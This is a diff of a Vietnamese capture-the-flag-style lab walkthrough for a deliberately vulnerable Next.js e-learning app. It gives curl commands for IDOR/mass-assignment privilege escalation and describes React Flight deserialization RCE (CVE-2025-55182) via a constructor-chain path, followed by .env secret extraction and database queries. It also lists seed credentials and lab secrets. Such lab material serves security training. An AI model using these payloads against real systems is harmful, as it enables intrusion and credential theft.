@@ -2,21 +2,34 @@
 
 ## 1. Mục Tiêu Bài Lab & Tổng Quan Kỹ Thuật
 
-**The Academic Curator** là nền tảng quản lý học tập điện tử phát triển trên nền tảng Next.js 15.0.3 và React 19.0.0-rc. Mục tiêu của bài thực hành này là hoàn thành chuỗi khai thác an ninh 4 giai đoạn liên hoàn (**End-to-End Cyber Kill Chain**):
-1. **Giai đoạn 1 (Initial Access)**: Đăng nhập hoặc đăng ký tài khoản sinh viên để thu thập phiên làm việc hợp lệ qua NextAuth v5.
+**The Academic Curator** là nền tảng quản lý học tập điện tử phát triển trên nền tảng Next.js 15.0.3 và React 19.0.0-rc. Mục tiêu của bài thực hành là hoàn thành chuỗi khai thác an ninh 4 giai đoạn liên hoàn (**End-to-End Cyber Kill Chain**):
+
+1. **Giai đoạn 1 (Initial Access)**: Đăng nhập tài khoản sinh viên (`STUDENT`) để thu thập phiên làm việc hợp lệ qua NextAuth v5 và trích xuất CUID của người dùng.
 2. **Giai đoạn 2 (Privilege Escalation)**: Khai thác kết hợp lỗ hổng Tham chiếu đối tượng trực tiếp không an toàn (**IDOR**) và Gán thuộc tính hàng loạt (**Mass Assignment**) trên Server Action `updateUserProfile` để nâng quyền lên Giảng viên (`LECTURER`).
 3. **Giai đoạn 3 (Framework-Level RCE)**: Khai thác lỗ hổng Giải mã đối tượng không an toàn (**Insecure Deserialization - CVE-2025-55182 / React2Shell**) trên giao thức React Server Components Flight Stream tại Server Action `createAssignment` để thực thi mã tùy ý (RCE) trên máy chủ Node.js.
 4. **Giai đoạn 4 (Post-Exploitation & Pivoting)**: Trích xuất bí mật hệ thống từ tệp `.env`, thu thập thông tin xác thực cơ sở dữ liệu nội bộ và truy vấn trực tiếp container PostgreSQL (`elearning-db`).
 
 ---
 
-## 2. Thông Tin Môi Trường & Tài Khoản Thử Nghiệm
+## 2. Bản Đồ Cổng Dịch Vụ & Thông Tin Môi Trường
 
-- **Địa chỉ máy chủ mục tiêu**: `http://localhost:3000` (hoặc `http://<TARGET_IP>:3000`)
+### 2.1. Bản Đồ Cổng (Reconnaissance & Decoy Profile)
+Khi tiến hành quét cổng bằng `nmap -sV -sC -p- <TARGET_IP>`, hệ thống sẽ hiển thị bề mặt dịch vụ:
+
+| Cổng (Port) | Dịch Vụ | Banner / Phiên Bản | Vai Trò Trong Bài Lab |
+|---|---|---|---|
+| **21/tcp** | FTP | `vsFTPd 3.0.5` | **Decoy / Rabbit Hole** (Từ chối Anonymous `530 Login incorrect`) |
+| **80/tcp** | HTTP | `nginx/1.24.0 (Ubuntu)` | **Reverse Proxy** (Chuyển tiếp vào Web App chính) |
+| **2222/tcp**| SSH | `OpenSSH 8.9p1 Ubuntu` | **Decoy / Rabbit Hole** (Chỉ nhận Publickey) |
+| **3000/tcp**| HTTP | `Next.js 15.0.3 / Node.js` | **Mục Tiêu Khai Thác Chính (React2Shell Lab Target)** |
+| **5432/tcp**| PostgreSQL | `PostgreSQL 16-alpine` | **Cơ sở dữ liệu nội bộ** (Target cho Giai đoạn 4 Pivoting) |
+| **6379/tcp**| Redis | `Redis 7-alpine` | **Decoy / Rabbit Hole** (Yêu cầu mật khẩu `NOAUTH`) |
+| **8080/tcp**| HTTP | `Spring Boot Actuator` | **Decoy / Rabbit Hole** (`/actuator/health`, `/api/internal/` 403) |
+
+### 2.2. Tài Khoản Thử Nghiệm Mặc Định (Seed Accounts)
 - **Tài khoản Sinh viên (Student)**: `student@elearning.com` / `password123`
 - **Tài khoản Giảng viên (Lecturer)**: `lecturer@elearning.com` / `password123`
 - **Tài khoản Quản trị viên (Admin)**: `admin@elearning.com` / `password123`
-- **Dịch vụ Cơ sở dữ liệu nội bộ**: `elearning-db:5432` (`postgres:16-alpine`)
 
 ---
 
@@ -36,9 +49,9 @@ Set-Cookie: authjs.csrf-token=bb2b5d2baeae0a109c173617582d978bfbc7b187aad5333bd4
 ```
 
 ### Bước 1.2: Đăng nhập bằng Tài khoản Sinh viên
-Gửi yêu cầu POST chứa `csrfToken` cùng thông tin đăng nhập:
+Trích xuất giá trị `csrfToken` và gửi yêu cầu POST đăng nhập:
 ```bash
-CSRF_TOKEN="bb2b5d2baeae0a109c173617582d978bfbc7b187aad5333bd4ad314e7c5eb80c"
+CSRF_TOKEN=$(curl -s -c cookies.txt http://localhost:3000/api/auth/csrf | grep -o '"csrfToken":"[^"]*"' | cut -d'"' -f4)
 
 curl -i -s -b cookies.txt -c cookies.txt \
   -d "csrfToken=${CSRF_TOKEN}&email=student@elearning.com&password=password123" \
@@ -59,21 +72,23 @@ curl -s -b cookies.txt http://localhost:3000/student/settings | grep -o 'value="
 
 ### Bước 2.1: Phân tích Nguyên nhân Lỗ hổng
 Tại tệp mã nguồn `lib/actions/user.ts`, Server Action `updateUserProfile(userId, updateData)` có hai điểm yếu an ninh:
-1. **IDOR**: Hàm không kiểm tra tính tương đương giữa `session.user.id` của người gọi và `userId` mục tiêu.
-2. **Mass Assignment**: Dữ liệu `updateData` được gán trực tiếp (`...updateData`) vào câu lệnh cập nhật `prisma.user.update` mà không có schema lọc (whitelist), cho phép ghi đè trường `role`.
+1. **IDOR**: Hàm nhận `userId` từ client mà không đối chiếu với `session.user.id` của người gọi.
+2. **Mass Assignment**: Dữ liệu `updateData.role` được chấp nhận và cập nhật trực tiếp vào `prisma.user.update` mà không qua whitelist DTO.
 
 ### Bước 2.2: Xác định Server Action ID
 Trong Next.js 15, mỗi Server Action được gán một Action ID duy nhất dạng băm SHA-1:
-- Action ID của `updateUserProfile`: `0003834fbecc7cc1359c9730a8fda880e2b5306d07` (trích xuất từ `.next/server/server-reference-manifest.json`).
+- Action ID của `updateUserProfile`: `0003834fbecc7cc1359c9730a8fda880e2b5306d07` (hoặc trích xuất tự động từ manifest).
 
 ### Bước 2.3: Gửi Gói Tin Khai Thác Leo Thang Đặc Quyền
 Gửi yêu cầu HTTP POST Server Action chứa payload chèn `"role": "LECTURER"`:
 ```bash
+USER_ID="cmt8y3z4e0002kcbrwl8eq5bt" # Thay bằng CUID lấy được ở Bước 1.3
+
 curl -i -s -b cookies.txt -c cookies.txt \
   -H "Host: localhost:3000" \
   -H "Origin: http://localhost:3000" \
   -H "Next-Action: 0003834fbecc7cc1359c9730a8fda880e2b5306d07" \
-  -F '0=["cmt8y3z4e0002kcbrwl8eq5bt",{"email":"student@elearning.com","role":"LECTURER"}]' \
+  -F "0=[\"${USER_ID}\",{\"email\":\"student@elearning.com\",\"role\":\"LECTURER\"}]" \
   http://localhost:3000/student/settings
 ```
 *Kết quả:* Cơ sở dữ liệu cập nhật trường `role` của sinh viên thành `LECTURER`.
@@ -99,7 +114,7 @@ curl -s -b cookies.txt -o /dev/null -w "%{http_code}\n" http://localhost:3000/le
 ## 5. Giai Đoạn 3: Thực Thi Mã Từ Xa (React2Shell - CVE-2025-55182)
 
 ### Bước 5.1: Cơ Chế Phân Giải Đối Tượng Trong React Flight Protocol
-Trong các phiên bản tồn tại lỗ hổng của `react-server-dom-webpack` (`< 19.0.1`), bộ phân giải stream Flight (`parseModelString` / `getOutlinedModel`) cho phép truy vết thuộc tính đối tượng phân cách bằng dấu hai chấm (`:`).
+Trong `react-server-dom-webpack` phiên bản tiền phát hành (`19.0.0-rc-66855b96`), bộ phân giải stream Flight (`parseModelString` / `getOutlinedModel`) cho phép truy vết thuộc tính đối tượng phân cách bằng dấu hai chấm (`:`).
 
 Cấu trúc luồng khai thác:
 - **Chunk 1**: Định nghĩa Server Reference mô tả Server Action `createAssignment` (Action ID: `408c92d53a78edb220ec3787802802d39f9d02e4cf`).
@@ -107,7 +122,7 @@ Cấu trúc luồng khai thác:
 - **Chunk 0**: Sử dụng đường dẫn thuộc tính `"$2:constructor:constructor"` để truy vết ngược qua chuỗi prototype:
   $$\text{createAssignment} \xrightarrow{\text{.constructor}} \text{AsyncFunction} \xrightarrow{\text{.constructor}} \mathbf{Function}$$
 
-Hàm khởi tạo `Function` của Node.js runtime được phân giải trực tiếp và liên kết với mã thực thi tùy ý.
+Hàm khởi tạo `Function` của Node.js runtime được phân giải trực tiếp và liên kết với payload thực thi lệnh OS.
 
 ### Bước 5.2: Gửi Payload Khai Thác RCE
 Gửi HTTP POST multipart request chứa chuỗi stream Flight Protocol:
@@ -127,15 +142,20 @@ curl -i -s -b cookies.txt \
 ## 6. Giai Đoạn 4: Khai Thác Hậu Xâm Nhập & Pivoting Nội Bộ
 
 ### Bước 6.1: Đọc Biến Môi Trường Hệ Thống
-Trích xuất tệp `.env` để thu thập cấu hình kết nối cơ sở dữ liệu và khóa bí mật:
-- `DATABASE_URL`: `postgresql://postgres:postgres123@elearning-db:5432/elearning_db?schema=public`
-- `AUTH_SECRET`: `f4_igYGrQwVoTeMuCtbo6eUcayGV5m5Eg__tuWigngcKQuKJ02ZG9xcjrtkvFgOplWevvblkn2NyGfJtyclKX5Q=`
-- `DB_INTERNAL_HOST`: `elearning-db`
+Sau khi có RCE, trích xuất tệp `.env` để thu thập cấu hình kết nối cơ sở dữ liệu và khóa bí mật:
+```bash
+# Thông tin trích xuất từ tệp .env:
+DATABASE_URL="postgresql://postgres:postgres@localhost:5432/elearning"
+AUTH_SECRET="k8sJ3mP9xR2vL5nQ7wF0yT4uA6bD1eH"
+DB_INTERNAL_HOST=elearning-db
+DB_USER=readonly_auditor
+DB_PASS=Learning@2026!
+```
 
 ### Bước 6.2: Truy Vấn Cơ Sở Dữ Liệu PostgreSQL Nội Bộ
 Kết nối trực tiếp vào container cơ sở dữ liệu `elearning-db:5432`:
 ```bash
-docker exec -it elearning-db psql -U postgres -d elearning_db -c 'SELECT id, email, role FROM "User";'
+docker exec -it elearning-db psql -U postgres -d elearning -c 'SELECT id, email, role FROM "User";'
 ```
 
 *Dữ liệu trích xuất:*
